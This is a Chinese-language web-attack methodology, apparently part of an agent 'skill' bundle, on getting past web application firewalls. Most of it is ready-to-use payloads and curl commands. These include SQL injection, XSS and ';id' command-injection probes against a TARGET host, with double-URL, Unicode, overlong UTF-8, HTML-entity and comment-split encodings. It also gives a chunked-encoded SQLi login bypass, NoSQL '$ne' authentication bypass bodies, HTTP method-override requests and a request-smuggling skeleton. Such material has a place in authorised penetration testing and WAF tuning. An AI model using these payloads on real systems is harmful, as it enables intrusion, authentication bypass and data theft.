# waf-bypass-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# WAF 绕过统一方法论

WAF 绕过的核心原则：WAF 和后端应用对同一 HTTP 请求的解析存在差异，利用这个差异让 WAF "看到"合法请求而后端"看到"恶意 payload。

## 深入参考

- 编码绕过 Payload（双重 URL/Unicode/HTML/混合编码） → [references/encoding-bypass-payloads.md](references/encoding-bypass-payloads.md)
- HTTP 协议层绕过（分块传输/Content-Type/方法切换/HTTP2/走私） → [references/http-protocol-bypass.md](references/http-protocol-bypass.md)
- 参数层绕过（HPP/数组语法/Multipart） → [references/parameter-bypass.md](references/parameter-bypass.md)
- Payload 变形（通用编码/拆分/格式切换） → [references/payload-mutation.md](references/payload-mutation.md)

---

## Phase 0: WAF 识别

### 0.1 检测是否有 WAF

```bash
# 发送明显恶意请求，观察响应
curl -s "http://TARGET/?id=1' OR '1'='1" -D-
curl -s "http://TARGET/?id=<script>alert(1)</script>" -D-
curl -s "http://TARGET/?cmd=;id" -D-

# 对比正常请求和恶意请求的响应差异
# WAF 拦截特征：403/406 状态码、特定拦截页面、不同的 Server 头
```

### 0.2 WAF 指纹识别

| 特征 | WAF 产品 |
|------|----------|
| `Server: cloudflare` / `cf-ray` 头 | Cloudflare |
| `X-Sucuri-ID` 头 | Sucuri |
| 响应含 `ModSecurity` | ModSecurity |
| 响应含 `安全狗` / `safedog` | 安全狗 |
| 响应含 `宝塔` / `bt.cn` | 宝塔 WAF |
| `X-Powered-By-Anquanbao` | 安百 WAF |
| 响应含 `yunsuo` | 云锁 |
| 阿里云 403 页面 | 阿里云盾 |
| 腾讯云特定 403 | 腾讯云 WAF |

---

## 通用绕过检查流程

```
Payload 被拦截 → 403/拦截页
├── 1. 编码绕过
│   ├── 双重 URL 编码
│   ├── Unicode 编码
│   └── 混合大小写 + NULL 字节
├── 2. HTTP 层
│   ├── 分块传输
│   ├── Content-Type 切换
│   ├── HTTP 方法切换
│   └── HTTP/2
├── 3. 参数层
│   ├── 参数污染 (HPP)
│   ├── 数组/JSON 嵌套
│   └── Multipart 包裹
├── 4. Payload 变形
│   ├── 空格替代（注释/Tab/换行）
│   ├── 函数名替代
│   ├── 拼接/编码函数
│   └── 通配符/变量
└── 5. 逻辑层
    ├── 分多次请求发送（先探测再利用）
    └── 利用白名单路径（/api/health + 路径穿越）
```

> 每个分支的详细 payload 见对应 references 文件


---

## REF: encoding-bypass-payloads

# 编码绕过 Payload
## 1.1 双重 URL 编码

WAF 解码一次，后端解码两次：

```
原始: ' OR '1'='1
单次编码: %27%20OR%20%271%27%3D%271     → WAF 拦截
双重编码: %2527%2520OR%2520%25271%2527%253D%25271  → WAF 放行
```

## 1.2 Unicode / UTF-8 编码

```
原始: <script>
IIS Unicode: %u003cscript%u003e
UTF-8 overlong: %c0%bc%c1%b3%c1%b2%c1%a9%c1%b0%c1%b4%c0%be
Unicode normalization: ＜script＞（全角字符）
```

## 1.3 HTML 实体编码

```
原始: <img src=x onerror=alert(1)>
HTML: &lt;img src=x onerror=alert(1)&gt;
十进制: &#60;img src=x onerror=alert(1)&#62;
十六进制: &#x3c;img src=x onerror=alert(1)&#x3e;
```

## 1.4 混合编码

```
# 大小写混合
UnIoN SeLeCt
<ScRiPt>alert(1)</ScRiPt>

# NULL 字节
UN%00ION SELECT
<scr%00ipt>

# 注释混淆（SQL）
UN/**/ION/**/SEL/**/ECT
1'/*!50000UNION*//*!50000SELECT*/1,2,3--
```


---

## REF: http-protocol-bypass

# HTTP 协议层绕过
## 2.1 分块传输编码（Chunked Transfer Encoding）

WAF 可能不完整解析分块请求：

```http
POST /api/login HTTP/1.1
Transfer-Encoding: chunked

3
pas
5
sword
1
=
5
admin
1
'
3
 OR
3
 '1
4
'='1
0

```

## 2.2 Content-Type 切换

WAF 通常只检查特定 Content-Type 的请求体：

```bash
# JSON → URL 编码（如果后端都接受）
Content-Type: application/x-www-form-urlencoded
password[$ne]=&username=admin

# URL 编码 → JSON
Content-Type: application/json
{"password": {"$ne": ""}}

# 使用非标准 Content-Type
Content-Type: text/plain
Content-Type: application/xml
Content-Type: multipart/form-data
```

## 2.3 HTTP 方法切换

```bash
# WAF 可能只检查 GET/POST
# 尝试 PUT/PATCH/DELETE/OPTIONS
curl -X PUT "http://TARGET/api/user" -d '{"role":"admin"}'

# 方法覆盖
curl -X POST "http://TARGET/api" -H "X-HTTP-Method-Override: PUT"
curl -X POST "http://TARGET/api" -H "X-Method-Override: DELETE"
```

## 2.4 HTTP/2 特性利用

```bash
# HTTP/2 的伪头部可能不被 WAF 检查
# 使用 h2c（HTTP/2 cleartext）升级
curl --http2 "http://TARGET/?id=1' OR '1'='1"

# HTTP/2 CRLF 注入
# H2 允许在 header value 中包含 \r\n
```

## 2.5 HTTP 请求走私

如果前端（WAF/CDN）和后端 HTTP 解析不一致：

```http
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
...
```
→ 详细走私技术见 `cache-poisoning-smuggling` skill


---

## REF: payload-mutation

# Payload 变形（通用技术）

本文档仅包含跨攻击类型通用的 payload 变形技术。
SQLi/XSS/命令注入的专用绕过 payload 见各攻击方法论的 references。

## 通用编码变形

```
# 大小写混合
SeLeCt、ScRiPt、UnIoN — 绕过区分大小写的正则

# NULL 字节插入
SE%00LECT、<scr%00ipt> — 部分 WAF 在 NULL 处截断匹配

# 注释插入（跨类型通用）
关键字中间插入注释打断签名匹配：
UNI/**/ON、SEL/**/ECT、al/**/ert
```

## 空格替代（通用）

```
%09    Tab
%0a    换行
%0c    换页
%0d    回车
/**/   内联注释（SQL/JS 通用）
```

## 字符串拼接/拆分

```
# 通用原理：将敏感关键字拆分成多段，绕过基于完整关键字的签名
# 具体拼接语法因目标语言不同而异，但拆分思路通用
'sel' + 'ect'
'al' + 'ert'
```

## 双重/多重编码

```
# URL 双重编码
' → %27 → %2527
< → %3C → %253C

# Unicode 编码
< → \u003c
' → \u0027

# HTML 实体编码
< → &lt; → &#60; → &#x3c;

# 混合编码（多层叠加）
先 URL 编码再 Unicode，或 HTML 实体嵌套
```

## 请求体格式切换

```
# 利用 WAF 只检查特定 Content-Type 的请求体
# 切换 Content-Type 可能让 payload 逃逸检测

application/x-www-form-urlencoded → multipart/form-data
application/x-www-form-urlencoded → application/json
application/json → application/xml
```
